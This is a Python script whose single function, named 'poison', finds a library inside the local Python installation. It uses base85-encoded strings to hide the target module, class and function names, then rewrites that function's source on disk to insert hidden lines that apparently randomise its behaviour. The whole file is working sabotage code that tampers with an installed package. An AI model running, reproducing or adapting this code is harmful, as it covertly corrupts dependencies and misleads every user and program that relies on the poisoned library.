import inspect

import pathlib
import sys
import base64


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path /
        base64.b85decode("b7^#CEpTCDYhh<)a{").decode('utf-8') /
        base64.b85decode("bZ>HFXm)9HX>V=").decode('utf-8') /
        base64.b85decode("ZEs{{Y;y").decode('utf-8') /
        base64.b85decode("a%FRFWpplZc>").decode('utf-8'))

    class_name = base64.b85decode("Qe|^aWppTRZZ1u4WOZz1DF").decode('utf-8')
    function_name = base64.b85decode("UuJJ|cVTj5UukV{Yy").decode('utf-8')

    lines = module_path.read_text().splitlines()

    class_definition = ''
    function_line = 0
    function_definition = ''

    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line

    if not class_definition:
        print("Couldn't find class.")
    if not function_definition:
        print("Couldn't find function definition")
    rand_init = base64.b85decode("ARr(hARr(hZXi7%bZ>HFXfASLZe(e0bSN+^ATcp4ASf{`DJd>#bY*QQDF").decode('utf-8')
    condition = base64.b85decode("ARr(hARr(hX=Wg9ASEC&AU!=GFgg").decode('utf-8')
    randomize = base64.b85decode("ARr(hARr(hARr(hcpyC>bZ>HFXfASLZe(s>Y-wv{D0nF").decode('utf-8')
    new_code = [rand_init, condition, randomize]

    lines[function_line:function_line] = new_code
    module_path.write_text('\n'.join(lines), encoding='utf-8')
